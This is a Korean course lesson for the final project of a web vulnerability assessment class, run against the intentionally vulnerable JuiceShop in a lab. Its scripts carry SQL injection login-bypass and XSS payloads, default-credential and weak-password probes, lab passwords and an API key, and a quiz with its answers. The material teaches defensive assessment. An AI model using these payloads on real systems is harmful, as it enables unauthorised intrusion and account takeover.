@@ -1,0 +1,797 @@
+# Week 15: 기말 -- 종합 웹취약점 점검 프로젝트 (상세 버전)
+
+## 학습 목표
+- 14주간 배운 모든 점검 기법을 종합하여 실제 웹 애플리케이션을 점검한다
+- 전문 수준의 취약점 점검 보고서를 작성한다
+- OWASP Testing Guide 기반 체계적 점검 절차를 수행한다
+- 점검 계획 수립부터 보고서 제출까지 전 사이클을 경험한다
+- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
+- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
+- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다
+
+
+## 실습 환경 (공통)
+
+| 서버 | IP | 역할 | 접속 |
+|------|-----|------|------|
+| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
+| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
+| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
+| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
+| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |
+
+**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`
+
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
+| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-2:00 | 실습 (Part 3) | 실습 |
+| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
+| 2:40-2:50 | 휴식 | - |
+| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
+| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |
+
+---
+
+
+---
+
+## 용어 해설 (웹취약점 점검 과목)
+
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
+| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
+| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
+| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
+| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
+| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
+| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
+| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
+| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
+| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
+| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
+| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
+| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
+| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
+| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
+| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
+| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
+| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |
+
+
+# 본 강의 내용
+
+# Week 15: 기말 -- 종합 웹취약점 점검 프로젝트
+
+## 학습 목표
+- 14주간 배운 모든 점검 기법을 종합하여 실제 웹 애플리케이션을 점검한다
+- 전문 수준의 취약점 점검 보고서를 작성한다
+- OWASP Testing Guide 기반 체계적 점검 절차를 수행한다
+- 점검 계획 수립부터 보고서 제출까지 전 사이클을 경험한다
+
+## 전제 조건
+- Week 01~14 전체 내용 숙지
+- 점검 보고서 작성 경험 (Week 14)
+
+---
+
+## 1. 기말 시험 구성 (10분)
+
+### 대상: JuiceShop (http://10.20.30.80:3000)
+
+### 점검 범위
+1. 정보수집 (Week 03)
+2. 인증/세션 관리 (Week 04)
+3. SQL Injection (Week 05)
+4. XSS/CSRF (Week 06)
+5. 파일/명령어 주입 (Week 07)
+6. 접근제어 (Week 09)
+7. 암호화/통신 보안 (Week 10)
+8. 에러 처리/정보 노출 (Week 11)
+9. API 보안 (Week 12)
+
+### 채점 기준 (100점)
+
+| 항목 | 배점 | 기준 |
+|------|------|------|
+| 취약점 발견 수 | 30점 | 10개 이상 만점 |
+| CVSS 점수 정확성 | 15점 | 각 취약점 CVSS 산정 |
+| 재현 절차 | 20점 | 명령어 단위 재현 가능 |
+| 권고사항 | 15점 | 실현 가능한 보완 방안 |
+| 보고서 품질 | 20점 | 체계적 구성, 명확한 서술 |
+
+---
+
+## 2. Phase 1: 점검 계획 수립 (20분)
+
+### 2.1 대상 시스템 정보 수집
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+echo "=== 점검 대상 시스템 정보 ==="
+
+echo "--- 서비스 상태 ---"
+curl -s -o /dev/null -w "JuiceShop: HTTP %{http_code}\n" http://localhost:3000/
+curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered|content-type):"
+
+echo ""
+echo "--- API 엔드포인트 탐색 ---"
+for ep in rest/products/search?q= api/Users api/Products api/Challenges api-docs ftp; do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
+  echo "  /$ep -> HTTP $CODE"
+done
+
+echo ""
+echo "--- 기술 스택 식별 ---"
+curl -s http://localhost:3000/package.json 2>/dev/null | python3 -c "
+import json,sys
+try:
+    d = json.load(sys.stdin)
+    print(f'  앱: {d.get(\"name\",\"?\")} v{d.get(\"version\",\"?\")}')
+    deps = d.get('dependencies',{})
+    for k in list(deps.keys())[:5]:
+        print(f'  의존성: {k} {deps[k]}')
+except: print('  package.json 파싱 실패')
+" 2>/dev/null
+ENDSSH
+```
+
+### 2.2 점검 계획서 작성
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+python3 << 'PYEOF'
+from datetime import datetime
+
+plan = f"""
+================================================================
+           웹 취약점 점검 계획서
+================================================================
+프로젝트: 기말 종합 점검
+대상: OWASP JuiceShop (http://10.20.30.80:3000)
+일시: {datetime.now().strftime('%Y-%m-%d')}
+점검자: (학번/이름)
+방법론: OWASP Testing Guide v4.2
+
+점검 범위:
+  - 웹 프런트엔드 (Angular SPA)
+  - REST API (/rest/*, /api/*)
+  - 인증/세션 관리
+  - 파일 업로드/다운로드
+  범위 제외: OS, 네트워크, DoS
+
+일정:
+  - 정보 수집: 20분
+  - 취약점 점검: 60분
+  - 보고서 작성: 40분
+  - 검토/발표: 20분
+
+안전 수칙:
+  - 승인된 대상만 점검
+  - DoS 공격 금지
+  - 발견된 민감 데이터 즉시 삭제
+================================================================
+"""
+print(plan)
+PYEOF
+ENDSSH
+```
+
+---
+
+## 3. Phase 2: 정보 수집 (20분)
+
+### 3.1 보안 헤더 및 설정 점검
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+echo "=== 보안 헤더 점검 ==="
+HEADERS=$(curl -sI http://localhost:3000/)
+
+for hdr in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" \
+           "Strict-Transport-Security" "X-XSS-Protection" "Referrer-Policy"; do
+  if echo "$HEADERS" | grep -qi "$hdr"; then
+    echo "[OK] $(echo "$HEADERS" | grep -i "$hdr" | head -1 | tr -d '\r')"
+  else
+    echo "[MISSING] $hdr"
+  fi
+done
+
+echo ""
+echo "=== 디렉토리/파일 노출 점검 ==="
+for path in ".git/HEAD" ".env" "package.json" "robots.txt" "api-docs" "ftp"; do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
+  if [ "$CODE" = "200" ]; then
+    echo "[EXPOSED] /$path (HTTP $CODE)"
+  else
+    echo "[SAFE] /$path (HTTP $CODE)"
+  fi
+done
+ENDSSH
+```
+
+### 3.2 HTTP 메서드 및 서버 정보
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+echo "=== HTTP 메서드 점검 ==="
+for method in GET POST PUT DELETE OPTIONS TRACE PATCH; do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/api/Products)
+  echo "  $method /api/Products -> HTTP $CODE"
+done
+
+echo ""
+echo "=== 디폴트 계정 점검 ==="
+for cred in "admin@juice-sh.op:admin123" "admin:admin" "test@test.com:test"; do
+  IFS=":" read -r email pass <<< "$cred"
+  RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")
+  if echo "$RESULT" | grep -q "authentication"; then
+    echo "  [VULN] $email / $pass -> 로그인 성공"
+  else
+    echo "  [SAFE] $email / $pass -> 실패"
+  fi
+done
+ENDSSH
+```
+
+---
+
+## 4. Phase 3: 취약점 점검 (60분)
+
+### 4.1 SQL Injection 점검
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+echo "=== SQL Injection 점검 ==="
+
+echo "--- 로그인 SQLi ---"
+RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
+if echo "$RESULT" | grep -q "authentication"; then
+  echo "[CRITICAL] 로그인 SQLi -> 인증 우회 성공"
+  echo "$RESULT" | python3 -c "
+import json,sys
+d = json.load(sys.stdin)
+auth = d.get('authentication',{})
+print(f'  이메일: {auth.get(\"umail\",\"N/A\")}')
+print(f'  토큰: {auth.get(\"token\",\"\")[:40]}...')
+" 2>/dev/null
+else
+  echo "[SAFE] 로그인 SQLi 차단"
+fi
+
+echo ""
+echo "--- 검색 SQLi ---"
+NORMAL=$(curl -s "http://localhost:3000/rest/products/search?q=apple" | wc -c)
+SQLI=$(curl -s "http://localhost:3000/rest/products/search?q='+OR+1=1--" | wc -c)
+echo "  정상: ${NORMAL}B / SQLi: ${SQLI}B"
+[ "$SQLI" -gt "$NORMAL" ] && echo "  [HIGH] 검색 SQLi 취약" || echo "  [SAFE] 검색 SQLi 안전"
+ENDSSH
+```
+
+### 4.2 XSS 및 접근제어 점검
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+echo "=== XSS 점검 ==="
+XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>")
+
+for payload in "${XSS_PAYLOADS[@]}"; do
+  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
+  RESP=$(curl -s "http://localhost:3000/rest/products/search?q=${ENCODED}")
+  if echo "$RESP" | grep -qF "$payload"; then
+    echo "  [HIGH] 반사형 XSS: $payload"
+  else
+    echo "  [SAFE] 필터됨: $payload"
+  fi
+done
+
+echo ""
+echo "=== 접근제어 점검 ==="
+echo "--- 인증 없이 API 접근 ---"
+for ep in "api/Users" "api/Challenges" "api/Quantitys"; do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/$ep")
+  echo "  /$ep -> HTTP $CODE"
+  [ "$CODE" = "200" ] && echo "    [MEDIUM] 인증 없이 접근 가능"
+done
+
+echo ""
+echo "--- 패스워드 정책 ---"
+for pw in "1" "abc" "a"; do
+  RESULT=$(curl -s -X POST http://localhost:3000/api/Users/ \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"pwtest_$(date +%s%N)@t.com\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"a\"}")
+  if echo "$RESULT" | grep -q "\"id\""; then
+    echo "  [MEDIUM] 약한 패스워드 허용: '$pw'"
+  fi
+done
+ENDSSH
+```
+
+### 4.3 인증 및 세션 점검
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+echo "=== 계정 잠금 정책 점검 ==="
+echo "5회 연속 실패 시도..."
+for i in $(seq 1 5); do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
+  echo "  시도 $i: HTTP $CODE"
+done
+echo "  -> 5회 실패 후에도 계정 잠금 없으면 [MEDIUM] 취약"
+
+echo ""
+echo "=== JWT 토큰 분석 ==="
+TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | \
+  python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+
+if [ -n "$TOKEN" ] && [ "$TOKEN" != "" ]; then
+  echo "$TOKEN" | cut -d. -f2 | python3 -c "
+import base64, sys, json
+token_part = sys.stdin.read().strip()
+padding = 4 - len(token_part) % 4
+decoded = base64.urlsafe_b64decode(token_part + '=' * padding)
+payload = json.loads(decoded)
+print(f'  알고리즘 확인 필요 (none 취약점)')
+print(f'  사용자: {payload.get(\"data\",{}).get(\"email\",\"N/A\")}')
+print(f'  역할: {payload.get(\"data\",{}).get(\"role\",\"N/A\")}')
+" 2>/dev/null
+fi
+ENDSSH
+```
+
+---
+
+## 5. Phase 4: 보고서 작성 (40분)
+
+### 5.1 보고서 형식
+
+```markdown
+# 웹 취약점 점검 보고서
+
+## 1. 개요
+- 점검 대상, 범위, 기간, 점검자
+
+## 2. 총평
+- 전체 취약점 현황 요약, 위험도 분포
+
+## 3. 취약점 상세
+### 3.1 [취약점명]
+- 위험도: Critical/High/Medium/Low
+- CVSS: X.X
+- 위치: URL/파라미터
+- 재현 절차: (명령어 단위)
+- 영향:
+- 권고사항:
+
+## 4. 결론 및 권고
+```
+
+### 5.2 종합 보고서 자동 생성
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+python3 << 'PYEOF'
+from datetime import datetime
+
+findings = [
+    {"id":"V-001","name":"SQL Injection (로그인 우회)","severity":"Critical","cvss":9.8,
+     "cwe":"CWE-89","location":"POST /rest/user/login (email)",
+     "fix":"Parameterized Query 또는 ORM 사용"},
+    {"id":"V-002","name":"XSS (검색 반사형)","severity":"High","cvss":7.1,
+     "cwe":"CWE-79","location":"GET /rest/products/search (q)",
+     "fix":"출력 인코딩, CSP 헤더"},
+    {"id":"V-003","name":"API 접근제어 부재","severity":"Medium","cvss":5.3,
+     "cwe":"CWE-284","location":"GET /api/Users",
+     "fix":"JWT 인증 필수화"},
+    {"id":"V-004","name":"약한 패스워드 정책","severity":"Medium","cvss":5.3,
+     "cwe":"CWE-521","location":"POST /api/Users",
+     "fix":"최소 8자, 복잡도 요구"},
+    {"id":"V-005","name":"보안 헤더 누락","severity":"Medium","cvss":4.3,
+     "cwe":"CWE-693","location":"전체 응답",
+     "fix":"CSP, X-Frame-Options 등 헤더 추가"},
+    {"id":"V-006","name":"계정 잠금 부재","severity":"Medium","cvss":5.3,
+     "cwe":"CWE-307","location":"POST /rest/user/login",
+     "fix":"5회 실패 시 잠금 또는 CAPTCHA"},
+    {"id":"V-007","name":"package.json 노출","severity":"Low","cvss":3.1,
+     "cwe":"CWE-200","location":"GET /package.json",
+     "fix":"정적 파일 접근 제한"},
+]
+
+stats = {}
+for f in findings:
+    s = f["severity"]
+    stats[s] = stats.get(s, 0) + 1
+
+report = f"""
+{'='*70}
+          종합 웹 취약점 점검 보고서
+{'='*70}
+프로젝트: 기말 종합 점검
+대상: OWASP JuiceShop (http://10.20.30.80:3000)
+일시: {datetime.now().strftime('%Y-%m-%d %H:%M')}
+방법론: OWASP Testing Guide v4.2
+
+1. 요약
+   총 발견: {len(findings)}건
+"""
+for sev in ["Critical","High","Medium","Low"]:
+    report += f"     {sev}: {stats.get(sev,0)}건\n"
+
+report += f"\n2. 발견사항 상세\n{'~'*60}\n"
+
+for f in findings:
+    report += f"""
+[{f['id']}] {f['name']}
+  심각도: {f['severity']} (CVSS {f['cvss']})
+  CWE: {f['cwe']}
+  위치: {f['location']}
+  권고: {f['fix']}
+"""
+
+report += f"""
+{'~'*60}
+
+3. 권고사항 우선순위
+   [즉시] V-001 SQL Injection 수정
+   [즉시] V-002 XSS 출력 인코딩
+   [단기] V-003 API 인증 강화
+   [단기] V-004 패스워드 정책
+   [단기] V-006 계정 잠금 정책
+   [일반] V-005 보안 헤더
+   [일반] V-007 파일 노출 차단
+
+{'='*70}
+"""
+print(report)
+PYEOF
+ENDSSH
+```
+
+---
+
+## 6. OpsClaw 연동 실습
+
+### 6.1 OpsClaw로 점검 자동화
+
+```bash
+export OPSCLAW_API_KEY=opsclaw-api-key-2026
+
+# 1. 프로젝트 생성
+echo "=== OpsClaw 프로젝트 생성 ==="
+PROJECT=$(curl -s -X POST http://localhost:8000/projects \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: $OPSCLAW_API_KEY" \
+  -d '{"name":"final-vuln-assessment","request_text":"기말 종합 점검","master_mode":"external"}')
+PID=$(echo "$PROJECT" | python3 -c "import json,sys; print(json.load(sys.stdin)['id'])")
+echo "Project ID: $PID"
+
+# 2. Stage 전환
+curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
+
+# 3. 점검 실행 (evidence 자동 기록)
+curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: $OPSCLAW_API_KEY" \
+  -d '{
+    "tasks": [
+      {"order":1,"instruction_prompt":"curl -sI http://localhost:3000/ | head -15","risk_level":"low"},
+      {"order":2,"instruction_prompt":"curl -s -X POST http://localhost:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'"'"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -5","risk_level":"low"}
+    ],
+    "subagent_url": "http://192.168.208.151:8002"
+  }' | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"results\",[]))}건')" 2>/dev/null
+
+# 4. evidence 확인
+echo ""
+curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
+  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -c "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, ensure_ascii=False)[:300])" 2>/dev/null
+```
+
+### 6.2 LLM 기반 보고서 품질 검증
+
+```bash
+curl -s http://192.168.0.105:11434/v1/chat/completions \
+  -H "Content-Type: application/json" \
+  -d '{
+    "model": "gemma3:12b",
+    "messages": [
+      {"role": "system", "content": "보안 컨설팅 심사관입니다. 취약점 점검 보고서를 평가합니다. 한국어로."},
+      {"role": "user", "content": "다음 취약점 기술의 품질을 10점 만점으로 평가하세요:\n\n[V-001] SQL Injection (로그인 우회)\n심각도: Critical (CVSS 9.8)\nCWE: CWE-89\n위치: POST /rest/user/login (email 파라미터)\n재현: Body={\"email\":\"'"'"' OR 1=1--\",\"password\":\"x\"} -> 인증 토큰 발급\n권고: Parameterized Query 사용\n\n1) 재현성 2) 영향 분석 3) 권고 구체성 4) 전체 점수"}
+    ],
+    "temperature": 0.3
+  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
+```
+
+---
+
+## 7. 과목 총정리
+
+### 7.1 15주 학습 맵
+
+```
+Week 01-02: 기초         -> 점검 개론, 도구 환경 구축
+Week 03-04: 정보수집/인증 -> 디렉토리 스캔, 세션 관리
+Week 05-07: 입력값 검증   -> SQLi, XSS, CSRF, 파일 업로드
+Week 08:    중간고사      -> JuiceShop 점검 보고서
+Week 09-12: 고급 점검     -> 접근제어, 암호화, 에러, API
+Week 13-14: 도구/보고서   -> 자동화 도구, CVSS, 보고서
+Week 15:    기말          -> 종합 점검 프로젝트
+```
+
+### 7.2 핵심 역량 자가 진단
+
+| 역량 | 확인 |
+|------|------|
+| 대상 시스템의 기술 스택을 식별할 수 있는가? | |
+| 블라인드 SQLi를 포함한 다양한 SQLi를 점검할 수 있는가? | |
+| 반사형/저장형/DOM XSS를 구분하고 점검할 수 있는가? | |
+| IDOR, 수직/수평 권한 상승을 점검할 수 있는가? | |
+| REST API 인증/인가를 체계적으로 점검할 수 있는가? | |
+| 점검 스크립트를 작성하고 결과를 분석할 수 있는가? | |
+| CVSS 기반 전문 보고서를 작성할 수 있는가? | |
+
+---
+
+## 제출물
+1. 취약점 점검 보고서 (PDF 또는 Markdown)
+2. OpsClaw 프로젝트 ID (evidence 자동 확인용)
+3. 재현 스크립트 (모든 취약점 재현 가능)
+
+---
+
+## 핵심 정리
+
+1. 웹취약점 점검은 계획-수집-점검-보고의 체계적 사이클이다
+2. OWASP Testing Guide는 산업 표준 점검 방법론이다
+3. 자동 도구와 수동 점검을 조합하면 최적의 결과를 얻는다
+4. 보고서는 재현성, 영향 분석, 구체적 권고사항이 핵심이다
+5. 점검은 반드시 승인된 범위 내에서 윤리적으로 수행한다
+
+## 다음 학기 예고
+보안시스템 운영 (Course 2) 또는 보안관제 (Course 5) 수강 권장
+
+
+---
+
+## 심화 학습: 개념 확장
+
+### 핵심 개념 상세 해설
+
+이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.
+
+#### 개념 1: 동작 원리 (Course 3)
+
+이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.
+
+```
+[1단계] 입력/요청 → 시스템이 데이터를 수신
+[2단계] 처리 → 내부 로직에 의한 데이터 처리
+[3단계] 출력/응답 → 결과 반환 또는 상태 변경
+[4단계] 기록 → 로그/증적 생성
+```
+
+> **왜 이 순서가 중요한가?**
+> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
+> 1단계: 입력값 검증 미흡 → Injection
+> 2단계: 인가 확인 누락 → Broken Access Control
+> 3단계: 에러 정보 노출 → Information Disclosure
+> 4단계: 로깅 실패 → Monitoring Failures
+
+#### 개념 2: 보안 관점에서의 위험 분석
+
+| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
+|----------|---------|--------|---------|
+| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
+| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
+| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
+| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |
+
+#### 개념 3: 실제 사례 분석
+
+**사례 1: 유사 취약점이 실제 피해로 이어진 경우**
+
+실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
+공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.
+
+**교훈:**
+- 기본적인 보안 조치의 중요성
+- 탐지 체계의 필수성
+- 사고 대응 절차의 사전 수립 필요성
+
+### 도구 비교표
+
+| 도구 | 용도 | 장점 | 단점 | 라이선스 |
+|------|------|------|------|---------|
+| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
+| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
+| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |
+
+
+---
+
+## 보충 실습
+
+### 보충 실습 1: 기본 동작 확인
+
+이론에서 배운 내용을 직접 확인하는 기초 실습이다.
+
+```bash
+# Step 1: 현재 상태 확인
+echo "=== 현재 상태 ==="
+# (해당 주차에 맞는 확인 명령)
+
+# Step 2: 설정/변경 적용
+echo "=== 변경 적용 ==="
+# (해당 주차에 맞는 실습 명령)
+
+# Step 3: 결과 검증
+echo "=== 결과 확인 ==="
+# (변경 결과 확인 명령)
+```
+
+> **트러블슈팅:**
+> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
+> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
+> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인
+
+### 보충 실습 2: 탐지/모니터링 관점
+
+공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.
+
+```bash
+# siem 서버에서 관련 로그 확인
+sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null
+
+# Suricata 알림 확인 (해당 시)
+sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
+  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
+```
+
+> **왜 방어자 관점도 배우는가?**
+> 공격 기법만 알면 "스크립트 키디"에 불과하다.
+> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
+> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.
+
+### 보충 실습 3: OpsClaw 자동화
+
+이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.
+
+```bash
+# 프로젝트 생성 (이번 주차용)
+RESULT=$(curl -s -X POST http://localhost:8000/projects \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsclaw-api-key-2026" \
+  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
+PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
+
+# Stage 전환
+curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+
+# 실습 태스크 실행 (해당 주차에 맞게 수정)
+curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsclaw-api-key-2026" \
+  -d '{
+    "tasks": [
+      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
+      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
+    ],
+    "subagent_url":"http://localhost:8002",
+    "parallel":true
+  }'
+
+# Evidence 확인
+curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
+  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
+```
+
+
+---
+
+## 자가 점검 퀴즈 (10문항)
+
+이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.
+
+**Q1.** 이번 주차 "Week 15: 기말 -- 종합 웹취약점 점검 프로젝트"의 핵심 목적은 무엇인가?
+- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인
+
+**Q2.** 이 주제에서 OWASP의 역할은?
+- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의
+
+**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
+- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력
+
+**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
+- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함
+
+**Q5.** 이 주제의 보안 위험이 높은 이유는?
+- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제
+
+**Q6.** 방어/대응의 핵심 원칙은?
+- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경
+
+**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
+- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜
+
+**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
+- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음
+
+**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
+- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식
+
+**Q10.** 다음 주차와의 연결 포인트는?
+- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만
+
+**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b
+
+---
+
+## 과제 (다음 주까지)
